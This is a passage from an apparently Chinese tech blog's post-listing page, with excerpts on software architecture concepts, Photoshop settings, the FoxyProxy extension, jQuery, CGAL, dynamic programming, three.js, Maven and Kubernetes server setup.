软件模块（Module）是一套一致而互相有紧密关连的软件组织。它分别包含了程序和数据结构两部分。现代软件开发往往利用模块作为合成的单位。模块的接口表达了由该模块提供的功能和调用它时所需的元素。模块是可能分开被编写的单位。这使它们可再用和允许人员同时协作、编写及研究不同的模块。
软件组件定义为自包含的、可编程的、可重用的、与语言无关的软件单元，软件组件可以很容易被用于组装应用程序中。
可能你看完这两个定义后一头雾水，还是不知道这两者有什么区别。造成这种现象的根本原因是，模块和组件都是系统的组成部分，只是从不同的角度拆分系统而已。
从逻辑的角度来拆分系统后，得到的单元就是“模块”；从物理的角度来拆分系统后，得到的单元就是“组件”。划分模块的主要目的是职责分离；划分组件的主要目的是单元复用。其实，“组件”的英文 component 也可翻译成中文的“零件”一词，“零件”更容易理解一些，“零件”是一个物理的概念，并且具备“独立且可替换”的特点。
我以一个最简单的网站系统来为例。假设我们要做一个学生信息管理系统，这个系统从逻辑的角度来拆分，可以分为“登录注册模块”“个人信息模块”“个人成绩模块”；从物理的角度来拆分，可以拆分为 Nginx、Web 服务器、MySQL。
4. 框架与架构 框架是和架构比较相似的概念，且两者有较强的关联关系，所以在实际工作中，这两个概念有时我们容易分不清楚。参考维基百科上框架与架构的定义，我来解释两者的区别。
软件框架（Software
framework）通常指的是为了实现某个业界标准或完成特定基本任务的软件组件规范，也指为了实现某个软件组件规范时，提供规范所要求之基础功能的软件产品。
提炼一下其中关键部分：
1.框架是组件规范：例如，MVC 就是一种最常见的开发规范，类似的还有 MVP、MVVM、J2EE 等框架。
2. 框架提供基础功能的产品：例如，Spring MVC 是 MVC 的开发框架，除了满足 MVC 的规范，Spring 提供了很多基础功能来帮助我们实现功能，包括注解（@Controller 等）、Spring Security、Spring JPA 等很多基础功能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d6ccd1648766c9ee30d08ed0733249d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb33ce3d50751dc0ec6c575fd6568a87/" rel="bookmark">
			架构篇03：我们为什么要做架构设计？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 架构设计的误区架构设计的真正目的简单的复杂度分析案例 谈到架构设计，相信每个技术人员都是耳熟能详，但如果深入探讨一下，“为何要做架构设计？”或者“架构设计目的是什么？”类似的问题，大部分人可能从来没有思考过，或者即使有思考，也没有太明确可信的答案。
架构设计的误区 关于架构设计的目的，常见的误区有：
因为架构很重要，所以要做架构设计 这是一句正确的废话，架构是很重要，但架构为何重要呢？
例如：不做架构设计系统就跑不起来么？
其实不然，很多朋友尤其是经历了创业公司的朋友可能会发现，公司的初始产品可能没有架构设计，大伙撸起袖子简单讨论一下就开始编码了，根本没有正规的架构设计过程，而且也许产品开发速度还更快，上线后运行也还不错。
例如：做了架构设计就能提升开发效率么？
也不尽然，实际上有时候最简单的设计开发效率反而是最高的，架构设计毕竟需要投入时间和人力，这部分投入如果用来尽早编码，项目也许会更快。
例如：设计良好的架构能促进业务发展么？
好像有一定的道理，例如设计高性能的架构能够让用户体验更好，但反过来想，我们照抄微信的架构，业务就能达到微信的量级么？肯定不可能，不要说达到微信的量级，达到微信的 1/10 做梦都要笑醒了。
不是每个系统都要做架构设计吗 这其实是知其然不知其所以然，系统确实要做架构设计，但还是不知道为何要做架构设计，反正大家都要做架构设计，所以做架构设计肯定没错。
这样的架构师或者设计师很容易走入生搬硬套业界其他公司已有架构的歧路，美其名曰“参考”“微改进”。一旦强行引入其他公司架构后，很可能会发现架构水土不服，或者运行起来很别扭等各种情况，最后往往不得不削足适履，或者不断重构，甚至无奈推倒重来。
公司流程要求系统开发过程中必须有架构设计 与此答案类似还有因为“架构师总要做点事情”，所以要做架构设计，其实都是舍本逐末。因为流程有规定，所以要做架构设计；因为架构师要做事，所以要做架构设计，这都是很表面地看问题，并没有真正理解为何要做架构设计，而且很多需求并不一定要进行架构设计。如果认为架构师一定要找点事做，流程一定要进行架构设计，就会出现事实上不需要架构设计但形式上却继续去做架构设计，不但浪费时间和人力，还会拖慢整体的开发进度。
为了高性能、高可用、可扩展，所以要做架构设计 能够给出这个答案，说明已经有了一定的架构经历或者基础，毕竟确实很多架构设计都是冲着高性能、高可用……等“高 XX”的目标去的。
但往往持有这类观点的架构师和设计师会给项目带来巨大的灾难，这绝不是危言耸听，而是很多实际发生的事情，为什么会这样呢？因为这类架构师或者设计师不管三七二十一，不管什么系统，也不管什么业务，上来就要求“高性能、高可用、高扩展”，结果就会出现架构设计复杂无比，项目落地遥遥无期，团队天天吵翻天……等各种让人抓狂的现象，费尽九牛二虎之力将系统整上线，却发现运行不够稳定，经常出问题，出了问题很难解决，加个功能要改 1 个月……等各种继续让人抓狂的事件。
架构设计的真正目的 那架构设计的真正目的究竟是什么？
从上篇分享的架构设计的历史背景，可以看到，整个软件技术发展的历史，其实就是一部与“复杂度”斗争的历史，架构的出现也不例外。简而言之，架构也是为了应对软件系统复杂度而提出的一个解决方案，通过回顾架构产生的历史背景和原因，我们可以基本推导出答案：架构设计的主要目的是为了解决软件系统复杂度带来的问题。
这个结论虽然很简洁，但却是架构设计过程中需要时刻铭记在心的一条准则，为什么这样说呢？
首先，遵循这条准则能够让“新手”架构师心中有数，而不是一头雾水。
新手架构师开始做架构设计的时候，心情都很激动，希望大显身手，甚至恨不得一出手就设计出世界上最牛的 XX 架构，从此走上人生巅峰，但真的面对具体的需求时，往往都会陷入一头雾水的状态：
“这么多需求，从哪里开始下手进行架构设计呢？”。
“架构设计要考虑高性能、高可用、高扩展……这么多高 XX，全部设计完成估计要 1 个月，但老大只给了 1 周时间”。
“业界 A 公司的架构是 X，B 公司的方案是 Y，两个差别比较大，该参考哪一个呢？”。
以上类似问题，如果明确了“架构设计是为了解决软件复杂度”原则后，就很好回答。
“这么多需求，从哪里开始下手进行架构设计呢？”
——通过熟悉和理解需求，识别系统复杂性所在的地方，然后针对这些复杂点进行架构设计。
“架构设计要考虑高性能、高可用、高扩展……这么多高 XX，全部设计完成估计要 1 个月，但老大只给了 1 周时间”
——架构设计并不是要面面俱到，不需要每个架构都具备高性能、高可用、高扩展等特点，而是要识别出复杂点然后有针对性地解决问题。
“业界 A 公司的架构是 X，B 公司的方案是 Y，两个差别比较大，该参考哪一个呢？”
——理解每个架构方案背后所需要解决的复杂点，然后才能对比自己的业务复杂点，参考复杂点相似的方案。
其次，遵循这条准则能够让“老鸟”架构师有的放矢，而不是贪大求全。
技术人员往往都希望自己能够做出最牛的东西，架构师也不例外，尤其是一些“老鸟”架构师，为了证明自己的技术牛，可能会陷入贪大求全的焦油坑而无法自拔。例如：
“我们的系统一定要做到每秒 TPS 10 万”。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb33ce3d50751dc0ec6c575fd6568a87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f94b4341d460111ebb43533076d22dc3/" rel="bookmark">
			新到手的PS首选项设置（仅仅简单记录一下，请忽略）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单记录一下
去掉勾选的自动显示主屏幕，其他可以默认。ps2019以后变形缩放默认不需要按shift就直接可以等比例变换，如果不习惯可以勾选使用旧版自由变换。
可以调整主题色和字号等。
勾选过界，去掉勾选带动画效果的缩放。
16G内存设置60%以上，8G内存设置85%以上；历史状态大于等于50。可使用图形处理器。
改厘米单位有助于借助矩形选择工具拉标尺参考线精确确定宽度范围。
勾选保留细节2.0放大，尽量保持图片清晰度。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d75b105643e1bd87c478c676d74f22f/" rel="bookmark">
			安裝火狐和穀歌流覽器插件FoxyProxy管理海外動態IP代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代理生態系統擁有大量有用的實用程式，使海外代理IP代理設置的使用變得簡單起來。其中一種類型叫做代理管理工具，像FoxyProxy就是該工具集比較受歡迎的。
本文將全面解析FoxyProxy擴展的功能和特性、Foxyproxy怎麼下載、以及如何在穀歌流覽器和火狐流覽器中使用FoxyProxy插件管理海外動態IP代理。
FoxyProxy插件有什麼功能？ FoxyProxy插件是一款高級海外動態IP代理管理工具，可作為Google Chrome、Mozilla Firefox、Microsoft Edge和其他基於Chromium的流覽器的擴展，廣泛用於開發人員、IT 專業人員和出於隱私保護使用代理的個人。它簡化了多個代理之間的管理和切換任務，是一款很便捷的工具。 FoxyProxy插件有哪些優點？ 1. 基於模式的代理切換：此功能讓你能為訪問的URL定義模式。之後，可以將不同的代理分配給不同的模式。因此，當你訪問 URL 時，它會根據你預定義的模式自動通過適當的代理路由流量。
2. 多代理支持：它支持多個代理，讓你能輕鬆地在它們之間切換。只需單擊幾下即可添加、刪除、啟用或禁用代理。
3. 顏色編碼：為了幫助快速識別不同的代理和模式，它使用顏色編碼。你可以為不同的代理或模式分配不同的顏色，以便於識別。
4. 導入和導出設置：此功能允許導入和導出設置。當需要在多個設備上使用相同的配置或與其他人共用設置時，特別有用。
5. 日誌記錄：它提供所有代理活動的詳細日誌。此功能有利於調試和跟蹤目的。
6. 代理自動配置（PAC）檔：它可以根據當前的代理設置生成PAC檔，允許你在不同的流覽器或設備上使用相同的設置。
如何使用在穀歌流覽器上使用FoxyProxy插件？ 下麵是有關如何設置的分步指南：
第 1 步：下載並安裝擴展程式。 首先前往穀歌應用商店搜索FoxyProxy。單擊“添加到流覽器”按鈕安裝擴展程式。
安裝後，單擊右上角菜單中的小圖示，然後單擊“選項”。將打開一個新窗口。
第 2 步：添加代理。在“代理”選項卡中，單擊“添加新代理”。
在這需要輸入代理伺服器的詳細資訊，包括IP地址和端口號。你還可以為代理自定義喜歡的識別顏色。
步驟 3：從代理詳細資訊選項卡中，選擇手動代理配置並輸入代理伺服器資訊。
如果你位於學校或工作網路上，可以用自動代理配置URL。它會配置代理伺服器，你無需執行任何操作。
第 4 步：定義模式。現在導航到“URL 模式”選項卡並單擊“添加新模式”。在此部分中，定義要通過特定代理路由的 URL的模式，還可以選擇要用於此模式的代理。
選擇是否要將剛剛輸入的 URL 列入白名單或黑名單。列入黑名單的 URL 優先於列入白名單的 URL。
第 5 步：啟用代理配置檔。單擊擴展圖示並選擇： 如果要為所有網站啟用代理“配置檔案名稱”，請為所有 URL 使用代理“配置檔案名稱”。
如果你已將代理配置為在特定網站上工作，請根據預定義的模式和優先順序使用代理。
第 6 步：測試代理。現在可以檢查位置和IP地址是否已更改。
怎麼在火狐流覽器中使用FoxyProxy插件管理海外動態IP？ 第 1 步：單擊“添加到Firefox”，從應用商店下載並安裝擴展程式。
FoxyProxy for Firefox有兩個版本：FoxyProxy Basic 和 FoxyProxy Standard。標準版本提供了更多有用的功能，所以接下來的教程使用的是此版本。作為替代方案，如果你只想要一個具有開/關切換功能的代理切換器，可以嘗試基本版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d75b105643e1bd87c478c676d74f22f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d2c6c98051d0ab6431b79f66ab5a258/" rel="bookmark">
			JQuery的$(this)在if之后会变化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		$("[name='cmbTargetAssLangs']").on('change', function () { var val = $(this).find("option:selected").val(); $("#hdTargetAssLangId").val(val); var children = $(this).parent().next().children(); $.each(children,function(i,item){ if($(this).attr('href').indexOf('Translation')&gt;0){ var orgin = $(this).attr('href'); orgin = orgin.toString()+'/'+val.toString(); $(this).attr('href',orgin); } }); }); 此时用浏览器调试发现，每选择一次下拉框就会导致链接字符串变长
这是因为在Javascript中的 ( t h i s ) 调用不正确。在进入 ‘ i f ‘ 字句后， ‘ (this)调用不正确。在进入`if`字句后，` (this)调用不正确。在进入‘if‘字句后，‘(this)已经不是以前的那个$(this)`了。修改代码如下。
$("[name='cmbTargetAssLangs']").on('change', function () { var val = $(this).find("option:selected").val(); $("#hdTargetAssLangId").val(val); var children = $(this).parent().next().children(); $.each(children,function(i,item){ var link = $(this).attr('href'); var index = link.indexOf('Translation') if (index &gt; 0) { var endIndex = link.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d2c6c98051d0ab6431b79f66ab5a258/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4414e6c86fc3463e3b2b62e9563723c5/" rel="bookmark">
			如何利用chatgpt提升工作效率
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		chatgpt全领域小助手 项目管理：制定项目计划、跟踪进度、分配任务和记录里程碑。客户服务：回答常见问题、提供产品支持和处理客户投诉，提升客户满意度。销售支持：提供销售培训、销售脚本和客户资料，辅助销售团队进行销售活动。财务管理：制定预算、进行财务分析、管理账目和报销等。人力资源：筛选简历、安排面试、提供员工福利信息和处理员工关键问题。市场营销：提供市场调研数据、制定市场营销策略和执行市场推广活动。数据分析：处理和分析大量数据，并提供相关洞察和趋势分析。供应链管理：优化供应链流程、跟踪库存、协调供应商和处理物流问题。内部沟通：协助员工之间的交流、共享文件和安排会议。知识管理：整理和管理公司知识库，使其更易于访问和搜索。法律事务：提供法律咨询、起草合同和解答法律问题。安全管理：进行网络安全监控、数据保护和安全策略制定。教育和培训：提供在线教育和培训课程，辅助学习和知识传递。知识工作者支持：帮助知识工作者进行信息搜索、文献阅读和写作支持。咨询服务：提供管理咨询、人力资源咨询和技术咨询等专业咨询服务。产品开发：需求收集、原型设计和用户反馈分析。创意生成：与您进行创意对话，并提供新的创意和灵感。社交媒体管理：管理社交媒体账号、发布内容和回复用户评论。事件管理：管理会议、活动和项目进展，并提供相关信息和建议。翻译服务：提供实时翻译服务，帮助与不同语言的人进行交流。旅行规划：根据用户需求提供旅行目的地、路线规划和酒店推荐。餐厅推荐：根据用户喜好和地理位置推荐餐厅和菜品。健康咨询：提供健康问题解答、生活方式建议和疾病预防知识。网上购物：提供商品推荐、比较价格和处理退换货事宜。音乐推荐：根据用户喜好推荐音乐、创建播放列表和歌曲识别。电影推荐：根据用户喜好推荐电影、获取电影评论和演员信息。礼物选择：根据接收者的兴趣和特点推荐适合的礼物。智能家居控制：通过语音指令控制智能家居设备，如灯光、温度和安全设备等。语言学习：提供语法解释、单词记忆和口语练习支持。旅游指南：提供目的地信息、旅游景点介绍和当地文化背景。时尚搭配：根据用户风格和场合推荐服装搭配和时尚建议。社交技巧：提供社交场合中的礼仪、沟通技巧和人际关系建议。电子邮件管理：帮助整理和分类电子邮件、回复常见问题和过滤垃圾邮件。心理健康：提供情绪管理建议、心理疏导和压力缓解方法。新闻摘要：提供新闻摘要、时事评论和热门话题讨论。营养饮食：根据用户需求提供营养餐单、减肥建议和健康食谱。时间管理：提供时间管理技巧、任务优先级和日程安排。天气预报：提供实时天气信息、气象预警和旅行天气建议。交通导航：根据用户目的地提供最佳路线、实时交通状况和导航指引。社区支持：为社区居民提供社区活动信息、公共服务查询和建议反馈。美容护肤：根据用户肤质和需求推荐护肤产品和护理方法。宠物护理：提供宠物饲养建议、训练技巧和常见问题解答。游戏助手：提供游戏攻略、技巧分享和游戏评价。情感支持：提供情感咨询、分析情感问题和情绪管理建议。职业发展：提供职业规划建议、面试技巧和职业咨询。汽车维护：提供汽车保养建议、故障排除和购车指南。家居装修：根据用户需求提供装修建议、家居风格搭配和材料推荐。婚礼策划：提供婚礼策划建议、婚纱选择和婚礼场地推荐。游戏推荐：根据用户喜好推荐手机游戏、电子游戏和桌游。社交活动组织：协助组织社交活动、发送邀请和安排活动日程。 这些用途只是一些示例，实际上，ChatGPT 可以在许多其他领域中提供帮助和支持。无论是需要自动化任务、获取信息、解决问题还是提供建议，ChatGPT 都可以根据您的需求进行定制和使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d07e10a3a7e07921980f74f0cef5fa6/" rel="bookmark">
			CGAL::Plane_3＜K＞平面结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CGAL::Plane_3&lt;K&gt; 是 CGAL（Computational Geometry Algorithms Library）中的一个类，代表三维空间中的一个平面。在这个类中，K 是一个内核类型参数，通常代表了一组几何对象的类型和操作，比如点、向量、平面等。K 决定了这些对象的内部表示和提供的算法。
平面的表示 在 CGAL 中，一个平面通常由方程 ax + by + cz + d = 0 表示，其中 a、b、c 和 d 是平面方程的系数。这些系数定义了平面的方向（法向量）和它与原点的相对位置。
CGAL::Plane_3&lt;K&gt; 的主要特性和函数 构造函数：
Plane_3() 创建一个未初始化的平面。Plane_3(a, b, c, d) 通过直接给出平面方程的系数来创建一个平面。Plane_3(point, point, point) 通过三个点来定义一个平面。Plane_3(point, vector) 通过一个点和一个法向量来定义平面。 成员函数：
orthogonal_vector() 返回平面的一个法向量。to_2d(point) 将三维空间中的点投影到平面上的二维点。to_3d(point) 将平面上的二维点转换回三维空间中的点。opposite() 返回相反法向量的平面。 操作：
平面可以与其他几何对象进行交互，比如检查点是否在平面上、计算线与平面的交点等。 1、判断某点是否在平面中 #include &lt;CGAL/Simple_cartesian.h&gt; #include &lt;CGAL/Plane_3.h&gt; typedef CGAL::Simple_cartesian&lt;double&gt; Kernel; typedef Kernel::Point_3 Point_3; typedef Kernel::Plane_3 Plane_3; int main() { Point_3 p1(0, 0, 0), p2(1, 0, 0), p3(0, 1, 0); Plane_3 plane(p1, p2, p3); // 通过三个点定义平面 // 检查第四点是否在平面上 Point_3 p4(0, 0, 1); if (plane.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d07e10a3a7e07921980f74f0cef5fa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/204691d00067034149823b0d45376a52/" rel="bookmark">
			动态规划算法专题探究
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
第一章：动态规划算法理论基础
1.1动态规划概述
1.2动态规划的解题步骤
​​​​​​​1.3动态规划算法与贪心算法
​​​​​​​1.4算法报告架构
第二章：动态规划算法实战之背包问题
2.1 0-1背包问题
2.1.1题目：分割等和子集
2.1.1 算法设计思路
2.1.2 程序实现
2.1.3 算法分析
2.1.4 算法总结
2.2 完全背包问题
2.2.1 题目：完全平方数
2.2.1 算法设计思路
2.2.2 程序实现
2.2.3 算法分析
2.2.4 算法总结
第三章：动态规划算法实战之打劫、股票问题
3.1 打家劫舍系列问题
3.1.1 题目：打家劫舍II
3.1.2 算法设计思路
3.1.3 程序实现
3.1.4 算法分析
3.1.5 算法总结
3.2 股票问题
3.2.1 题目：买卖股票的最佳时机II
3.2.2 算法设计思路
3.2.3程序实现
3.2.4 算法分析
3.2.5算法总结
第四章：动态规划算法实战之子序列问题
4.1 不连续子序列问题
4.1.1 题目：最长公共子序列
4.1.2 算法设计思路
4.1.3 程序实现
4.1.4 算法分析与总结
4.2 编辑距离问题
4.2.1 题目：编辑距离
4.2.2 算法设计思路
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/204691d00067034149823b0d45376a52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a696d34c637dd6f71ac1701b19af4be2/" rel="bookmark">
			上门洗衣洗鞋小程序的发展前景怎么样
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着现代生活节奏的加快，人们对便利性的需求越来越高，上门洗衣洗鞋服务应运而生。这种服务模式以其便利、快捷、专业的特点，逐渐受到消费者的青睐。本文将就上门洗衣洗鞋的发展前景展开探讨。
首先，上门洗衣洗鞋服务的市场需求不断增长。现代人的生活节奏越来越快，很多人没有时间去洗衣店或鞋店排队等待，而上门洗衣洗鞋服务能够为他们提供更为便利的解决方案。随着消费观念的转变，越来越多的消费者开始重视便利性和专业性，愿意为此付出一定的费用。因此，从市场需求角度来看，上门洗衣洗鞋服务具有广阔的发展空间。
其次，上门洗衣洗鞋服务具有较高的利润率。相较于传统的洗衣店和鞋店，上门洗衣洗鞋服务的成本较低，因为不需要租赁房屋和雇佣员工等固定成本。同时，由于服务直接送到消费者手中，减少了中间环节和物流成本。因此，从利润角度来看，上门洗衣洗鞋服务具有较大的吸引力。
然而，上门洗衣洗鞋服务的发展也面临着一些挑战。首先，服务质量是关键。为了保证衣物和鞋子的清洗质量，需要专业的清洗设备和清洗剂，同时还需要专业的清洗人员。此外，为了保证服务的及时性和可靠性，需要建立高效的物流配送体系。这些都需要投入大量的资金和人力资源，是上门洗衣洗鞋服务发展的关键因素。
另外，安全问题也是上门洗衣洗鞋服务需要注意的问题。为了保证消费者的权益和安全，服务提供者需要建立完善的安全管理制度和风险控制体系，确保消费者的隐私和财产安全。同时，服务提供者还需要建立完善的客户服务体系和投诉处理机制，及时处理消费者的问题和反馈。
总的来说，上门洗衣洗鞋服务的发展前景是积极的。随着消费观念的转变和人们对便利性的需求增加，上门洗衣洗鞋服务的需求将会不断增长。然而，为了实现可持续发展，服务提供者需要注重提高服务质量、保证安全、加强管理等方面的工作。只有在满足了消费者需求的同时保证了服务质量和服务安全，才能赢得消费者的信任和支持。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16d4e0e053b3cc3216050c3ff7864d11/" rel="bookmark">
			2022、2023年网络系统管理资料 / 2022、2023年云计算赛项资料
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022、2023年网络系统管理赛项服务部署——完整版、赛题解析+视频验证
基于2023年全国职业院校技能大赛——网络系统管理赛项——Windows+Linux服务部署——完整版（包含 视频配置+赛题解析）
有需要可私信联系~
2022、2023年云计算赛项——赛题解析+视频配置验证；
基于2022、2023年国赛样题配置解析和视频验证；有需要可私信沟通联系！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b42f89a894362a17ef3922378cb4005/" rel="bookmark">
			three.js从入门到精通系列教程045 - 在平面上创建来回跳动的球体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;three.js从入门到精通系列教程045 - 在平面上创建来回跳动的球体&lt;/title&gt; &lt;script src="ThreeJS/three.js"&gt;&lt;/script&gt; &lt;script src="ThreeJS/jquery.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center id="myContainer"&gt;&lt;/center&gt; &lt;script&gt; //创建渲染器 var myRenderer = new THREE.WebGLRenderer({ antialias: true }); myRenderer.setSize(window.innerWidth, window.innerHeight); myRenderer.setClearColor('white', 1.0); myRenderer.shadowMapEnabled = true; $("#myContainer").append(myRenderer.domElement); var myScene = new THREE.Scene(); var myCamera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000); myCamera.position.set(64.7, 15.1, 17.8); myCamera.lookAt(myScene.position); var mySpotLight = new THREE.SpotLight(0xffffff); mySpotLight.position.set(-40, 40, -15); mySpotLight.castShadow = true; mySpotLight.shadow.mapSize = new THREE.Vector2(1024, 1024); mySpotLight.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b42f89a894362a17ef3922378cb4005/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c3ff4142ef4cc59f18fc9b5a7171d6d/" rel="bookmark">
			Maven工程继承和聚合关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Maven工程继承关系 1.1 继承概念 Maven 继承是指在 Maven 的项目中，让一个项目从另一个项目中继承配置信息的机制。继承可以让我们在多个项目中共享同一配置信息，简化项目的管理和维护工作。
1.2 继承作用 在父工程中统一管理项目中的依赖信息。
它的背景是：
对一个比较大型的项目进行了模块拆分。一个 project 下面，创建了很多个 module。每一个 module 都需要配置自己的依赖信息。 它背后的需求是：
在每一个 module 中各自维护各自的依赖信息很容易发生出入，不易统一管理。使用同一个框架内的不同 jar 包，它们应该是同一个版本，所以整个项目中使用的框架版本需要统一。使用框架时所需要的 jar 包组合（或者说依赖信息组合）需要经过长期摸索和反复调试，最终确定一个可用组合。这个耗费很大精力总结出来的方案不应该在新的项目中重新摸索。
通过在父工程中为整个项目维护依赖信息的组合既保证了整个项目使用规范、准确的 jar 包；又能够将以往的经验沉淀下来，节约时间和精力。 1.3 继承语法 父工程（父工程无须写 java 代码，因此 src 删除，只留下 pom.xml 即可）&lt;groupId&gt;com.atguigu.maven&lt;/groupId&gt; &lt;artifactId&gt;pro03-maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!-- 当前工程作为父工程，它要去管理子工程，所以打包方式必须是 pom --&gt; &lt;packaging&gt;pom&lt;/packaging&gt; 子工程（子工程在父工程下去创建，会发现子工程的 pom.xml 中多了一个 parent 标签）&lt;!-- 使用parent标签指定当前工程的父工程 --&gt; &lt;parent&gt; &lt;!-- 父工程的坐标 --&gt; &lt;groupId&gt;com.atguigu.maven&lt;/groupId&gt; &lt;artifactId&gt;pro03-maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;!-- 子工程的坐标 --&gt; &lt;!-- 如果子工程坐标中的groupId和version与父工程一致，那么可以省略 --&gt; &lt;!-- &lt;groupId&gt;com.atguigu.maven&lt;/groupId&gt; --&gt; &lt;artifactId&gt;pro04-maven-module&lt;/artifactId&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c3ff4142ef4cc59f18fc9b5a7171d6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf2b8db9833307f4415f448e56db4c0a/" rel="bookmark">
			three.js从入门到精通系列教程044 - 创建多个立方体添加鼠标事件移过选中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;three.js从入门到精通系列教程044 - 创建多个立方体添加鼠标事件移过选中&lt;/title&gt; &lt;script src="ThreeJS/three.js"&gt;&lt;/script&gt; &lt;script src="ThreeJS/jquery.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center id="myContainer"&gt;&lt;/center&gt; &lt;script&gt; //创建渲染器 var myRenderer = new THREE.WebGLRenderer({ antialias: true }); myRenderer.setSize(window.innerWidth, window.innerHeight); myRenderer.setClearColor('white', 1.0); $('#myContainer')[0].appendChild(myRenderer.domElement); var myScene = new THREE.Scene(); myScene.add(new THREE.AmbientLight(0xffffff)); var myCamera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000); myCamera.position.set(622, 342, 443); myCamera.lookAt(new THREE.Vector3(0, 0, 0)); //用于保存多个立方体 var myArray = []; //创建多个立方体 var myGeometry = new THREE.BoxGeometry(80, 80, 80); for (var i = 0; i &lt; 10; i++) { var myMaterial = new THREE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf2b8db9833307f4415f448e56db4c0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72e4ca91d32a64681d014d69dae9d797/" rel="bookmark">
			K8S搭建（centos）二、服务器设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		天行健，君子以自强不息；地势坤，君子以厚德载物。
每个人都有惰性，但不断学习是好好生活的根本，共勉！
文章均为学习整理笔记，分享记录为主，如有错误请指正，共同学习进步。
文章目录 服务器设置1. 基础参数查看1.1 查看本机ip1.2 查看系统参数1.3 查看内核参数1.4 查看mac address和product_uuid1.5 主机参数查看1.6 端口查看 2. 基础参数设置（每个节点）2.1 防火墙关闭2.2 交换内存swap分区关闭2.3 禁用SELinux2.4 节点互通配置2.4.1 修改主机名称2.4.2 主机名与ip绑定 2.5 时间同步设置2.6 可信列表配置（可跳过，本篇跳过） K8S搭建（ubuntu）系列：
k8s搭建（详细演示完整一篇）
k8s搭建（二、k8s组件安装）
K8S搭建（centos）系列：
K8S搭建（centos）完整版
K8S搭建（centos）一、环境准备
K8S搭建（centos）二、服务器设置
K8S搭建（centos）三、安装Docker
K8S搭建（centos）四、安装K8S
K8S搭建（centos）五、初始化（master节点）
K8S搭建（centos）六、搭建集群
K8S搭建（centos）七、节点加入集群
K8S搭建（centos）八、从节点中使用kubectl命令
K8S搭建（centos）九、集群节点的删除
K8S搭建（centos）十、Dashboard配置（主节点）
服务器设置 1. 基础参数查看 1.1 查看本机ip ifconfig 1.2 查看系统参数 uname -a 1.3 查看内核参数 cat /proc/version 1.4 查看mac address和product_uuid 需要确保每个机器的mac地址和product_uuid唯一，如果不唯一，安装k8s可能会失败
mac address为软件地址
product_uuid为硬件地址
正常硬件设备会拥有唯一的地址，但是有些虚拟机的地址可能会重复。
Kubernetes 使用这些值来唯一确定集群中的节点。 如果这些值在每个节点上不唯一，可能会导致安装 失败。
查看mac address
ip link 或
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72e4ca91d32a64681d014d69dae9d797/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
